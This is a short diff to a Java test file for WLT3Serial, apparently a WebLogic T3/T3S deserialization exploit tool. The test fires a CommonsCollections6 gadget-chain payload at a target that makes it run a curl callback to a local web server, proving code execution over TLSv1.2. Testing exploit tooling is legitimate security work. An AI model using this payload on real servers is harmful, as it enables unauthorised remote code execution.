@@ -1,7 +1,7 @@
 /*
 	TLSv12Test.java
 	
-	v0.3 (1/18/2018)
+	v0.4 (10/23/2018)
 
 	Test to ensure WLT3Serial communicates via T3S with TLSv1.2
 */
@@ -50,7 +50,7 @@ public class TLSv12Test {
 		String host = System.getProperty("wlt3.target.host");
 		String strPort = System.getProperty("wlt3.target.t3s.port");
 		String path = ws.createContext();
-		WLT3SerialTestHelper.runExploit("--t3s=TLSv1.2","CommonsCollections6","curl http://"+System.getProperty("localhost.ip")+":"+Integer.toString(ws.getPort())+"/"+path);
+		WLT3SerialTestHelper.runExploit("--t3s=TLSv1.2",null,"CommonsCollections6","curl http://"+System.getProperty("localhost.ip")+":"+Integer.toString(ws.getPort())+"/"+path);
 		
 		//create socket for retrieving SSLSocketFactory
 		int port = Integer.parseInt(strPort);
